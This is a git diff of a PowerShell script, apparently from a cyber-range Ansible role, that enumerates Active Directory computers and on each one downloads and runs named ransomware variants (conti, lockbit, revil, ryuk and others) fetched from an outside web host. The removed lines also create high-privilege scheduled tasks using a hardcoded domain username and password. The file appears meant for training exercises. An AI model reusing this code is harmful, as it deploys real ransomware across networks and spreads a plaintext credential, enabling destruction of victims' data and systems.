0dc0f79996755d6f0f484a4b3a838eb4bfaca8e4
davisshannon <williamshannondavis@gmail.com>
2022-03-12 13:31:17 +1100

    Update ransomware_iterate.ps1

--- ansible/roles/windows_domain_controller/files/ransomware_iterate.ps1
+++ ansible/roles/windows_domain_controller/files/ransomware_iterate.ps1
@@ -1,121 +1,74 @@
- Function Get-HostType {
-$type=Read-Host "
-1 - Win10
-2 - Server
-Please choose"
-Switch ($type){
-1 {$choice="Win10"}
-2 {$choice="Server"}
-}
-return $choice
-}
-
-$host_type = Get-HostType
-
-if($host_type -eq "Win10")
- {$computers = Get-ADComputer -Filter {operatingsystem -like "*10*"} | Select -ExpandProperty DNSHostName}
-else
- {$computers = Get-ADComputer -Filter {name -like "*server*"} | Select -ExpandProperty DNSHostName}
+ $computers = Get-ADComputer -Filter {operatingsystem -like "*10*"} | Select -ExpandProperty DNSHostName
 
 Function Get-VariantType {
 $type=Read-Host "
-1 - avaddon
-2 - babuk
-3 - blackmatter
-4 - conti
-5 - darkside
-6 - lockbit
-7 - maze
-8 - mespinoza
-9 - revil
-10 - ryuk
-11 - lockbit-report
-Please choose"
+Please enter your user number"
 Switch ($type){
-1 {$choice="avaddon"}
-2 {$choice="babuk"}
-3 {$choice="blackmatter"}
-4 {$choice="conti"}
-5 {$choice="darkside"}
-6 {$choice="lockbit"}
-7 {$choice="maze"}
-8 {$choice="mespinoza"}
-9 {$choice="revil"}
-10 {$choice="ryuk"}
-11 {$choice="lockbit-report"}
+1 {$variant_choice="avaddon-0"}
+2 {$variant_choice="blackmatter-0"}
+3 {$variant_choice="conti-0"}
+4 {$variant_choice="darkside-0"}
+5 {$variant_choice="lockbit-0"}
+6 {$variant_choice="maze-0"}
+7 {$variant_choice="mespinoza-0"}
+8 {$variant_choice="revil-0"}
+9 {$variant_choice="ryuk-0"}
+10 {$variant_choice="avaddon-1"}
+11 {$variant_choice="blackmatter-1"}
+12 {$variant_choice="conti-1"}
+13 {$variant_choice="darkside-1"}
+14 {$variant_choice="lockbit-1"}
+15 {$variant_choice="maze-1"}
+16 {$variant_choice="mespinoza-1"}
+17 {$variant_choice="revil-1"}
+18 {$variant_choice="ryuk-2"}
+19 {$variant_choice="avaddon-2"}
+20 {$variant_choice="blackmatter-2"}
+21 {$variant_choice="conti-2"}
+22 {$variant_choice="darkside-2"}
+23 {$variant_choice="lockbit-2"}
+24 {$variant_choice="maze-2"}
+25 {$variant_choice="mespinoza-2"}
+26 {$variant_choice="revil-2"}
+27 {$variant_choice="ryuk-3"}
+28 {$variant_choice="avaddon-3"}
+29 {$variant_choice="blackmatter-3"}
+30 {$variant_choice="conti-3"}
+31 {$variant_choice="darkside-3"}
+32 {$variant_choice="lockbit-3"}
+33 {$variant_choice="maze-3"}
+34 {$variant_choice="mespinoza-3"}
+35 {$variant_choice="revil-3"}
+36 {$variant_choice="ryuk-3"}
+37 {$variant_choice="avaddon-5"}
+38 {$variant_choice="blackmatter-4"}
+39 {$variant_choice="conti-4"}
+40 {$variant_choice="darkside-4"}
+41 {$variant_choice="lockbit-4"}
+42 {$variant_choice="maze-4"}
+43 {$variant_choice="mespinoza-4"}
+44 {$variant_choice="revil-4"}
+45 {$variant_choice="ryuk-5"}
+46 {$variant_choice="avaddon-6"}
+47 {$variant_choice="blackmatter-5"}
+48 {$variant_choice="conti-5"}
+49 {$variant_choice="darkside-5"}
+50 {$variant_choice="babuk-5"}
 }
-return $choice
+return $variant_choice
 }
 
 $variant = Get-VariantType
 
-if ($variant -eq "lockbit-report") {
+Write-Output "You are riding piggie " $variant
 
- Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/variants/files.txt" -OutFile "C:\files.txt"
 
- $file_list = Get-Content -Path C:\files.txt
+foreach ($element in $computers) {
 
- foreach ($element in $computers) {
-   $x = [array]::IndexOf($computers,$element)
-   foreach ($file in $file_list) {
-     if ($file -match "^" + $x + "-.") {
-       $filename = $file}
-   }
+$x = [array]::IndexOf($computers,$element)
+$filename = $variant + ".exe"
 
-   Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/variants/$Using:variant/$Using:filename" -OutFile "C:\ransom\$Using:filename"}
-   Start-Sleep 15
-
-   if ($filename -like "*.exe") {
-     Invoke-Command -AsJob -ComputerName $element -ScriptBlock {
-
-     $action = New-ScheduledTaskAction -Execute "C:\ransom\$using:filename";
-     $taskname = $using:filename;
-     $settings = New-ScheduledTaskSettingsSet -Priority 0
-
-     Unregister-ScheduledTask -TaskName $taskname -Confirm:$false;
-     Register-ScheduledTask -Action $action -User "SURGE\Shannon" -Password "Surg315C00l!" -TaskPath "\" -TaskName $taskname -RunLevel Highest -Settings $settings -Force ;
-     Start-ScheduledTask -TaskName $taskname -AsJob
-     }
-   }
-
-   if ($filename -like "*.ps1") {
-     Invoke-Command -AsJob -ComputerName $element -ScriptBlock {
-
-     $action = New-ScheduledTaskAction -Execute "powershell.exe -Argument -NoProfile -NoLogo -windowstyle Hidden -NonInteractive -ExecutionPolicy Bypass -File C:\ransom\$using:filename";
-     $taskname = $using:filename;
-     $settings = New-ScheduledTaskSettingsSet -Priority 0
-
-     Unregister-ScheduledTask -TaskName $taskname -Confirm:$false;
-     Register-ScheduledTask -Action $action -User "SURGE\Shannon" -Password "Surg315C00l!" -TaskPath "\" -TaskName $taskname -RunLevel Highest -Settings $settings -Force ;
-     Start-ScheduledTask -TaskName $taskname -AsJob
-
-     }
-   }
-
-    if ($filename -like "*.msi") {
-     Invoke-Command -AsJob -ComputerName $element -ScriptBlock {
-
-     $action = New-ScheduledTaskAction -Execute "msiexec.exe /i C:\ransom\$using:filename";
-     $taskname = $using:filename;
-     $settings = New-ScheduledTaskSettingsSet -Priority 0
-
-     Unregister-ScheduledTask -TaskName $taskname -Confirm:$false;
-     Register-ScheduledTask -Action $action -User "SURGE\Shannon" -Password "Surg315C00l!" -TaskPath "\" -TaskName $taskname -RunLevel Highest -Settings $settings -Force ;
-     Start-ScheduledTask -TaskName $taskname -AsJob
-
-     }
-   }
- }
- }
-
-elseif ($variant -ne "lockbit-report") {
- foreach ($element in $computers) {
-
- $x = [array]::IndexOf($computers,$element)
- $filename = $variant + "-" + $x + ".exe"
-
- Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/variants/$Using:variant/$Using:filename" -OutFile "C:\ransom\$Using:filename"}
- Start-Sleep 15
- Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Start-Process C:\ransom\$Using:filename -Wait}
- }
-} 
+Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/tuskcon/$Using:filename" -OutFile "C:\ransom\$Using:filename"}
+Start-Sleep 15
+Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Start-Process C:\ransom\$Using:filename -Wait}
+}
